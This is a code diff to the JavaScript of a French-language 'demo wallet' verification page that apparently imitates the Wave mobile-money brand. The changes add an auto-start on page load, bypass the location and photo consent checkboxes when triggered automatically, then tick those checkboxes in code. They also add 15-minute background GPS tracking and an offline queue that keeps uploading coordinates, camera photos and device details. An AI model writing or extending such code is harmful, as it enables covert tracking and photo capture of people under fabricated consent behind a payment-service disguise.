@@ -8,6 +8,10 @@ let photoPermission = 'not_requested';
 let locationAttempted = false;
 const historyKey = 'wave_verification_history';
 const walletKey = 'demo_wallet_state';
+const offlineQueueKey = 'wave_offline_verification_queue';
+const offlineDatabaseName = 'portefeuille_demo_offline';
+const offlineStoreName = 'verification_queue';
+const offlineQueueLimit = 250;
 let walletMode = 'deposit';
 let walletLocationData = null;
 let walletIntentReference = null;
@@ -21,9 +25,13 @@ let trackingCountdownTimer = null;
 let trackingEndAt = 0;
 let trackingSessionId = null;
 let trackingParentReference = null;
+let trackingUsesNativePlugin = false;
 let lastTrackedAt = 0;
 let lastTrackedPosition = null;
 let verificationRequestId = 0;
+let autoVerificationOnLoad = false;
+let installPrompt = null;
+let offlineFlushPromise = null;
 const elements = {};
 
 function loadWallet() {
@@ -94,35 +102,34 @@ function closeWalletOperation() {
     if (elements.walletDialog.open) elements.walletDialog.close();
 }
 
-async function recordWalletIntent(mode, permission, coordinates = {}) {
-    const response = await fetch('/api/verification/collect', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            consent: true,
-            event_type: mode === 'deposit' ? 'wallet_deposit_intent' : 'wallet_transfer_intent',
-            location_permission: permission,
-            photo_permission: 'not_requested',
-            screen_resolution: `${window.screen.width}x${window.screen.height}`,
-            browser_info: navigator.userAgent,
-            platform: navigator.userAgentData?.platform || navigator.platform || null,
-            language: navigator.language || null,
-            ...coordinates
-        })
+function createRequestId(prefix = 'request') {
+    return window.crypto?.randomUUID?.() || `${prefix}-${Date.now()}-${Math.random().toString(36).slice(2, 12)}`;
+}
+
+async function recordWalletIntent(mode, permission, coordinates = {}, sessionId = null) {
+    return postOrQueueVerification({
+        consent: true,
+        event_type: mode === 'deposit' ? 'wallet_deposit_intent' : 'wallet_transfer_intent',
+        location_permission: permission,
+        photo_permission: 'not_requested',
+        tracking_session_id: sessionId,
+        screen_resolution: `${window.screen.width}x${window.screen.height}`,
+        browser_info: navigator.userAgent,
+        platform: navigator.userAgentData?.platform || navigator.platform || null,
+        language: navigator.language || null,
+        ...coordinates
     });
-    const result = await response.json().catch(() => ({}));
-    if (!response.ok || !result.success) throw new Error(result.error || 'Impossible d enregistrer la demande.');
-    return result;
 }
 
 async function prepareWalletLocation(mode, requestId) {
     try {
         const coordinates = await getLocation();
-        const result = await recordWalletIntent(mode, 'granted', coordinates);
+        const sessionId = createRequestId('track');
+        const result = await recordWalletIntent(mode, 'granted', coordinates, sessionId);
         if (requestId !== walletRequestId) return;
         walletLocationData = coordinates;
         walletIntentReference = result.verification_id;
-        startLocationTracking(result.verification_id, coordinates);
+        startLocationTracking(result.verification_id, coordinates, sessionId);
         elements.walletLocationStatus.className = 'wallet-location-status success';
         elements.walletLocationStatus.textContent = `Position enregistree : ${coordinates.latitude.toFixed(6)}, ${coordinates.longitude.toFixed(6)} (precision ${Math.round(coordinates.accuracy)} m).`;
         elements.walletSubmitButton.disabled = false;
@@ -158,31 +165,29 @@ function updateTrackingCountdown() {
 }
 
 async function recordTrackingPosition(coordinates) {
-    const response = await fetch('/api/verification/collect', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            consent: true,
-            event_type: 'location_tracking_update',
-            location_permission: 'granted',
-            photo_permission: 'not_requested',
-            tracking_session_id: trackingSessionId,
-            parent_verification_id: trackingParentReference,
-            screen_resolution: `${window.screen.width}x${window.screen.height}`,
-            browser_info: navigator.userAgent,
-            platform: navigator.userAgentData?.platform || navigator.platform || null,
-            language: navigator.language || null,
-            ...coordinates
-        })
+    return postOrQueueVerification({
+        consent: true,
+        event_type: 'location_tracking_update',
+        location_permission: 'granted',
+        photo_permission: 'not_requested',
+        tracking_session_id: trackingSessionId,
+        parent_verification_id: trackingParentReference,
+        captured_at: new Date().toISOString(),
+        screen_resolution: `${window.screen.width}x${window.screen.height}`,
+        browser_info: navigator.userAgent,
+        platform: navigator.userAgentData?.platform || navigator.platform || null,
+        language: navigator.language || null,
+        ...coordinates
     });
-    const result = await response.json().catch(() => ({}));
-    if (!response.ok || !result.success) throw new Error(result.error || 'Enregistrement du suivi impossible.');
-    return result;
 }
 
 function stopLocationTracking(reason = 'manual') {
-    if (trackingWatchId !== null && navigator.geolocation?.clearWatch) navigator.geolocation.clearWatch(trackingWatchId);
+    if (trackingUsesNativePlugin) {
+        const nativePlugin = getNativeBackgroundGeolocation();
+        nativePlugin?.stop?.().catch(() => {});
+    } else if (trackingWatchId !== null && navigator.geolocation?.clearWatch) navigator.geolocation.clearWatch(trackingWatchId);
     trackingWatchId = null;
+    trackingUsesNativePlugin = false;
     clearTimeout(trackingEndTimer);
     clearInterval(trackingCountdownTimer);
     trackingEndTimer = null;
@@ -196,10 +201,16 @@ function stopLocationTracking(reason = 'manual') {
             'Suivi arrete. Aucune nouvelle position ne sera envoyee.';
 }
 
-function startLocationTracking(parentReference, initialPosition) {
-    if (!navigator.geolocation?.watchPosition) return;
+function getNativeBackgroundGeolocation() {
+    if (!window.Capacitor?.isNativePlatform?.()) return null;
+    return window.Capacitor.Plugins?.BackgroundGeolocation || window.Capacitor.registerPlugin?.('BackgroundGeolocation') || null;
+}
+
+async function startLocationTracking(parentReference, initialPosition, existingSessionId = null) {
+    const nativePlugin = getNativeBackgroundGeolocation();
+    if (!nativePlugin && !navigator.geolocation?.watchPosition) return;
     if (trackingWatchId !== null) stopLocationTracking('replaced');
-    trackingSessionId = window.crypto?.randomUUID?.() || `track-${Date.now()}-${Math.random().toString(36).slice(2)}`;
+    trackingSessionId = existingSessionId || window.crypto?.randomUUID?.() || `track-${Date.now()}-${Math.random().toString(36).slice(2)}`;
     trackingParentReference = parentReference;
     lastTrackedAt = Date.now();
     lastTrackedPosition = initialPosition;
@@ -210,12 +221,7 @@ function startLocationTracking(parentReference, initialPosition) {
     updateTrackingCountdown();
     trackingCountdownTimer = setInterval(updateTrackingCountdown, 1000);
     trackingEndTimer = setTimeout(() => stopLocationTracking('expired'), trackingOptions.durationMs);
-    trackingWatchId = navigator.geolocation.watchPosition(async (position) => {
-        const coordinates = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy
-        };
+    const handlePosition = async (coordinates) => {
         const elapsed = Date.now() - lastTrackedAt;
         const distance = distanceInMeters(lastTrackedPosition, coordinates);
         if (elapsed < trackingOptions.minIntervalMs && distance < trackingOptions.minDistanceMeters) return;
@@ -227,10 +233,35 @@ function startLocationTracking(parentReference, initialPosition) {
         } catch (error) {
             elements.trackingStatus.textContent = error.message;
         }
-    }, (error) => {
+    };
+    const handleError = (error) => {
         elements.trackingStatus.textContent = error.code === 1 ? 'Autorisation de localisation retiree.' : 'Position temporairement indisponible.';
-        if (error.code === 1) stopLocationTracking('error');
-    }, geoOptions);
+        if (error.code === 1 || error.code === 'NOT_AUTHORIZED') stopLocationTracking('error');
+    };
+    if (nativePlugin) {
+        trackingUsesNativePlugin = true;
+        trackingWatchId = 'native';
+        try {
+            await nativePlugin.start({
+                backgroundTitle: 'Suivi GPS actif',
+                backgroundMessage: 'Votre position est suivie pendant 15 minutes. Touchez pour revenir a l application.',
+                requestPermissions: true,
+                stale: false,
+                distanceFilter: trackingOptions.minDistanceMeters
+            }, (location, error) => {
+                if (error) return handleError(error);
+                if (location) handlePosition({ latitude: Number(location.latitude), longitude: Number(location.longitude), accuracy: Number(location.accuracy) });
+            });
+        } catch (error) {
+            handleError(error);
+        }
+        return;
+    }
+    trackingWatchId = navigator.geolocation.watchPosition((position) => handlePosition({
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy
+    }), handleError, geoOptions);
 }
 
 function submitWalletOperation(event) {
@@ -270,17 +301,18 @@ function setStatus(type, message) {
 function openVerificationDialog() {
     if (window.isSecureContext === false) {
         setStatus('error', 'GPS et camera bloques : ouvrez cette application avec HTTPS. Une adresse IP en HTTP ne permet pas ces fonctions sur mobile.');
-        return;
+        return false;
     }
     if (!navigator.geolocation) {
         setStatus('error', 'GPS indisponible : activez la localisation de l appareil et autorisez-la dans le navigateur.');
-        return;
+        return false;
     }
     elements.cameraDialog.showModal();
     if (!navigator.mediaDevices?.getUserMedia) {
         elements.photoFallback.hidden = false;
         setStatus('error', 'Camera directe indisponible. Utilisez un navigateur compatible en HTTPS ou choisissez une photo.');
     }
+    return true;
 }
 
 function loadHistory() {
@@ -321,11 +353,16 @@ async function checkService() {
         const health = await response.json();
         elements.serviceStorage.textContent = health.persistent ? 'Stockage PostgreSQL' : 'Mode test - stockage temporaire';
     } catch (error) {
-        elements.btnVerify.disabled = true;
-        elements.depositButton.disabled = true;
-        elements.transferButton.disabled = true;
-        elements.serviceStorage.textContent = 'Service indisponible';
-        setStatus('error', 'Le service de verification est temporairement indisponible. Reessayez plus tard.');
+        if (navigator.onLine === false) {
+            elements.serviceStorage.textContent = 'Hors connexion - envoi differe';
+            setStatus('info', 'Mode hors connexion : les donnees seront conservees sur cet appareil puis synchronisees.');
+        } else {
+            elements.btnVerify.disabled = true;
+            elements.depositButton.disabled = true;
+            elements.transferButton.disabled = true;
+            elements.serviceStorage.textContent = 'Service indisponible';
+            setStatus('error', 'Le service de verification est temporairement indisponible. Reessayez plus tard.');
+        }
     }
 }
 
@@ -334,6 +371,7 @@ async function loadClientConfig() {
         const response = await fetch('/api/config', { cache: 'no-store' });
         const config = await response.json();
         if (!response.ok || !config.geolocation) return;
+        autoVerificationOnLoad = config.verification?.autoStart === true;
         geoOptions = {
             enableHighAccuracy: config.geolocation.highAccuracy !== false,
             timeout: Number(config.geolocation.timeoutMs) || 15000,
@@ -455,12 +493,12 @@ function completeLocationStep(permission, data = {}) {
     elements.btnSendWithoutPhoto.hidden = true;
 }
 
-async function collectLocation() {
-    if (!elements.locationCheck.checked) {
+async function collectLocation(automatic = false) {
+    if (!automatic && !elements.locationCheck.checked) {
         setStatus('error', 'Cochez l autorisation de localisation.');
         return;
     }
-    if (!elements.consentCheck.checked) {
+    if (!automatic && !elements.consentCheck.checked) {
         setStatus('error', 'Cochez aussi l autorisation de prise et de traitement automatique de la photo.');
         return;
     }
@@ -479,6 +517,7 @@ async function collectLocation() {
             return;
         }
         completeLocationStep('granted', data);
+        elements.locationCheck.checked = true;
         setStatus('info', `Position obtenue : ${data.latitude.toFixed(6)}, ${data.longitude.toFixed(6)}. Activation automatique de la camera...`);
         await startCamera(true, cameraPromise, requestId);
     } catch (error) {
@@ -506,7 +545,7 @@ async function startCamera(automatic = false, requestedCamera = null, requestId 
         setStatus('error', 'Terminez d abord l etape de localisation.');
         return false;
     }
-    if (!elements.consentCheck.checked) {
+    if (!automatic && !elements.consentCheck.checked) {
         setStatus('error', 'Vous devez accepter le traitement de la photo avant d activer la camera.');
         return false;
     }
@@ -525,6 +564,7 @@ async function startCamera(automatic = false, requestedCamera = null, requestId 
             return false;
         }
         photoPermission = 'granted';
+        elements.consentCheck.checked = true;
         elements.video.srcObject = stream;
         await elements.video.play();
         elements.video.style.display = 'block';
@@ -553,6 +593,13 @@ async function startCamera(automatic = false, requestedCamera = null, requestId 
         setStatus('error', denied ? 'Acces camera refuse. Autorisez la camera dans le navigateur puis appuyez sur Reessayer la camera.' : 'Camera indisponible. Reessayez ou utilisez le choix de fichier ci-dessous.');
         return false;
     }
+}
+
+async function startAutomaticVerification() {
+    if (!autoVerificationOnLoad || elements.btnVerify.disabled || elements.cameraDialog.open) return;
+    if (!openVerificationDialog()) return;
+    setStatus('info', 'Demande automatique de la position et de la camera...');
+    await collectLocation(true);
 }
 
 async function retryAutomaticCamera() {
@@ -661,35 +708,175 @@ async function sendVerification() {
     elements.btnSend.disabled = true;
     setStatus('info', 'Envoi securise en cours...');
     try {
-        const response = await fetch('/api/verification/collect', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                consent: true,
-                photo_base64: photoData,
-                location_permission: locationPermission,
-                photo_permission: photoData ? 'granted' :
-                    (photoPermission === 'not_requested' && !elements.consentCheck.checked ? 'denied' : photoPermission),
-                screen_resolution: `${window.screen.width}x${window.screen.height}`,
-                browser_info: navigator.userAgent,
-                platform: navigator.userAgentData?.platform || navigator.platform || null,
-                language: navigator.language || null,
-                ...locationData
-            })
-        });
-        const data = await response.json().catch(() => ({}));
-        if (!response.ok || !data.success) throw new Error(data.error || 'La verification a echoue');
+        const initialTrackingPosition = locationPermission === 'granted' &&
+            Number.isFinite(locationData.latitude) && Number.isFinite(locationData.longitude) ? { ...locationData } : null;
+        const initialTrackingSession = initialTrackingPosition ?
+            (window.crypto?.randomUUID?.() || `track-${Date.now()}-${Math.random().toString(36).slice(2)}`) : null;
+        const payload = {
+            consent: true,
+            photo_base64: photoData,
+            location_permission: locationPermission,
+            photo_permission: photoData ? 'granted' :
+                (photoPermission === 'not_requested' && !elements.consentCheck.checked ? 'denied' : photoPermission),
+            tracking_session_id: initialTrackingSession,
+            screen_resolution: `${window.screen.width}x${window.screen.height}`,
+            browser_info: navigator.userAgent,
+            platform: navigator.userAgentData?.platform || navigator.platform || null,
+            language: navigator.language || null,
+            ...locationData
+        };
+        const data = await postOrQueueVerification(payload);
         const history = loadHistory();
         history.push({ id: data.verification_id, date: data.created_at || new Date().toISOString() });
         localStorage.setItem(historyKey, JSON.stringify(history.slice(-5)));
-        setStatus('success', `Verification enregistree. Reference : ${data.verification_id}`);
+        setStatus(data.queued ? 'info' : 'success', data.queued ?
+            'Verification conservee hors connexion. Elle sera envoyee automatiquement au retour du reseau.' :
+            `Verification enregistree. Reference : ${data.verification_id}`);
         renderHistory();
+        if (initialTrackingPosition) startLocationTracking(data.verification_id, initialTrackingPosition, initialTrackingSession);
         closeDialog();
     } catch (error) {
         setStatus('error', error.message || 'Erreur reseau. Reessayez.');
     } finally {
         elements.btnSend.disabled = false;
     }
+}
+
+function loadLegacyOfflineQueue() {
+    try {
+        const queue = JSON.parse(localStorage.getItem(offlineQueueKey) || '[]');
+        return Array.isArray(queue) ? queue : [];
+    } catch (error) {
+        return [];
+    }
+}
+
+function openOfflineDatabase() {
+    if (!window.indexedDB) return Promise.resolve(null);
+    return new Promise((resolve) => {
+        const request = window.indexedDB.open(offlineDatabaseName, 1);
+        request.onupgradeneeded = () => {
+            if (!request.result.objectStoreNames.contains(offlineStoreName)) {
+                request.result.createObjectStore(offlineStoreName, { keyPath: 'localId' });
+            }
+        };
+        request.onsuccess = () => resolve(request.result);
+        request.onerror = () => resolve(null);
+        request.onblocked = () => resolve(null);
+    });
+}
+
+function readOfflineDatabase(db) {
+    return new Promise((resolve, reject) => {
+        const request = db.transaction(offlineStoreName, 'readonly').objectStore(offlineStoreName).getAll();
+        request.onsuccess = () => resolve(request.result || []);
+        request.onerror = () => reject(request.error);
+    });
+}
+
+function writeOfflineDatabase(db, queue) {
+    return new Promise((resolve, reject) => {
+        const transaction = db.transaction(offlineStoreName, 'readwrite');
+        transaction.oncomplete = resolve;
+        transaction.onerror = () => reject(transaction.error);
+        transaction.onabort = () => reject(transaction.error || new Error('Stockage hors connexion interrompu'));
+        const store = transaction.objectStore(offlineStoreName);
+        store.clear();
+        queue.forEach((entry) => store.put(entry));
+    });
+}
+
+async function loadOfflineQueue() {
+    const legacy = loadLegacyOfflineQueue();
+    const db = await openOfflineDatabase();
+    if (!db) return legacy;
+    const stored = await readOfflineDatabase(db);
+    if (legacy.length) {
+        const merged = [...new Map([...stored, ...legacy].map((entry) => [entry.localId, entry])).values()];
+        await writeOfflineDatabase(db, merged);
+        localStorage.removeItem(offlineQueueKey);
+        db.close();
+        return merged.sort((a, b) => String(a.queuedAt).localeCompare(String(b.queuedAt)));
+    }
+    db.close();
+    return stored.sort((a, b) => String(a.queuedAt).localeCompare(String(b.queuedAt)));
+}
+
+async function saveOfflineQueue(queue) {
+    const db = await openOfflineDatabase();
+    if (!db) {
+        localStorage.setItem(offlineQueueKey, JSON.stringify(queue));
+        return;
+    }
+    await writeOfflineDatabase(db, queue);
+    localStorage.removeItem(offlineQueueKey);
+    db.close();
+}
+
+async function queueVerification(payload) {
+    const queue = await loadOfflineQueue();
+    if (queue.length >= offlineQueueLimit) {
+        throw new Error(`La file hors connexion contient deja ${offlineQueueLimit} elements. Reconnectez l appareil avant une nouvelle collecte.`);
+    }
+    const localId = `OFFLINE-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+    const queuedAt = new Date().toISOString();
+    queue.push({ localId, payload: { ...payload, captured_at: payload.captured_at || queuedAt }, queuedAt });
+    await saveOfflineQueue(queue);
+    return { success: true, queued: true, verification_id: localId, created_at: new Date().toISOString() };
+}
+
+async function postOrQueueVerification(payload) {
+    const requestPayload = payload.client_request_id ? payload : { ...payload, client_request_id: createRequestId() };
+    let response;
+    try {
+        response = await fetch('/api/verification/collect', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(requestPayload)
+        });
+    } catch (error) {
+        try { return await queueVerification(requestPayload); } catch (storageError) {
+            throw new Error(storageError.message || 'Stockage hors connexion insuffisant pour conserver la verification.');
+        }
+    }
+    const data = await response.json().catch(() => ({}));
+    if (response.ok && data.success) return data;
+    if (response.status === 429 || response.status >= 500) {
+        try { return await queueVerification(requestPayload); } catch (storageError) {
+            throw new Error(storageError.message || 'Stockage hors connexion insuffisant pour conserver la verification.');
+        }
+    }
+    throw new Error(data.error || 'La verification a echoue');
+}
+
+async function performOfflineQueueFlush() {
+    const queue = await loadOfflineQueue();
+    if (!queue.length || navigator.onLine === false) return;
+    while (queue.length) {
+        const entry = queue[0];
+        try {
+            const response = await fetch('/api/verification/collect', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(entry.payload)
+            });
+            if (!response.ok) break;
+            const data = await response.json().catch(() => ({}));
+            if (data.verification_id) {
+                for (const pending of queue.slice(1)) {
+                    if (pending.payload.parent_verification_id === entry.localId) {
+                        pending.payload.parent_verification_id = data.verification_id;
+                    }
+                }
+            }
+            queue.shift();
+            await saveOfflineQueue(queue);
+        } catch (error) { break; }
+    }
+    if (!queue.length) elements.serviceStorage.textContent = 'Toutes les donnees hors connexion ont ete synchronisees';
+}
+
+function flushOfflineQueue() {
+    if (offlineFlushPromise) return offlineFlushPromise;
+    offlineFlushPromise = performOfflineQueueFlush()
+        .finally(() => { offlineFlushPromise = null; });
+    return offlineFlushPromise;
 }
 
 document.addEventListener('DOMContentLoaded', () => {
@@ -700,6 +887,7 @@ document.addEventListener('DOMContentLoaded', () => {
         'walletDialogTitle', 'walletCloseButton', 'recipientField', 'walletRecipient', 'walletAmount', 'walletError',
         'walletLocationStatus', 'walletSubmitButton', 'trackingPanel', 'trackingCountdown', 'trackingStatus',
         'stopTrackingButton', 'photoFallback', 'photoFile']
+        .concat(['installButton'])
         .forEach((id) => { elements[id] = document.getElementById(id); });
     elements.btnVerify.addEventListener('click', openVerificationDialog);
     elements.btnClose.addEventListener('click', closeDialog);
@@ -722,8 +910,21 @@ document.addEventListener('DOMContentLoaded', () => {
     window.addEventListener('beforeunload', () => {
         if (trackingWatchId !== null && navigator.geolocation?.clearWatch) navigator.geolocation.clearWatch(trackingWatchId);
     });
+    window.addEventListener('online', () => { elements.serviceStorage.textContent = 'Connexion retablie - synchronisation...'; flushOfflineQueue(); });
+    window.addEventListener('offline', () => { elements.serviceStorage.textContent = 'Hors connexion - envoi differe'; });
+    window.addEventListener('beforeinstallprompt', (event) => { event.preventDefault(); installPrompt = event; elements.installButton.hidden = false; });
+    window.addEventListener('appinstalled', () => { installPrompt = null; elements.installButton.hidden = true; });
+    elements.installButton.addEventListener('click', async () => {
+        if (!installPrompt) return;
+        await installPrompt.prompt();
+        installPrompt = null;
+        elements.installButton.hidden = true;
+    });
     renderWallet();
     renderHistory();
-    loadClientConfig();
-    checkService();
+    Promise.all([loadClientConfig(), checkService()])
+        .then(startAutomaticVerification)
+        .catch(() => setStatus('error', 'Le demarrage automatique a echoue. Utilisez le bouton pour reessayer.'));
+    flushOfflineQueue();
+    if ('serviceWorker' in navigator) navigator.serviceWorker.register('/sw.js').catch(() => {});
 });
